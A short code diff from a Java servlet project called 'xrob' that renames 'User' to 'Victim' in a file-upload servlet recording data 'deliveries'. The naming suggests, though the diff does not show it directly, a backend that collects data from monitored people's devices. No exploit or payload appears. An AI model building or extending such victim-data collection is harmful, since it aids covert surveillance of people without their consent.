@@ -3,7 +3,7 @@ package com.theah64.xrob.api.servlets;
 import com.theah64.xrob.api.database.tables.BaseTable;
 import com.theah64.xrob.api.database.tables.Deliveries;
 import com.theah64.xrob.api.models.Delivery;
-import com.theah64.xrob.api.models.User;
+import com.theah64.xrob.api.models.Victim;
 import com.theah64.xrob.api.utils.*;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -57,14 +57,14 @@ public class FileUploadServlet extends BaseServlet {
             final Request request = new Request(req, requiredParams);
 
 
-            final String userId = headerSecurity.getUserId();
+            final String victimId = headerSecurity.getVictimId();
 
             final boolean hasError = request.getBooleanParameter(KEY_ERROR);
             final String message = request.getStringParameter(KEY_MESSAGE);
             final String dataType = request.getStringParameter(KEY_DATA_TYPE);
 
             //Has all needed params, so add it to deliveries
-            final Delivery newDelivery = new Delivery(userId, hasError, message, dataType);
+            final Delivery newDelivery = new Delivery(victimId, hasError, message, dataType);
             //What ever the data_type, adding delivery;
             Deliveries.getInstance().addv2(newDelivery);
 
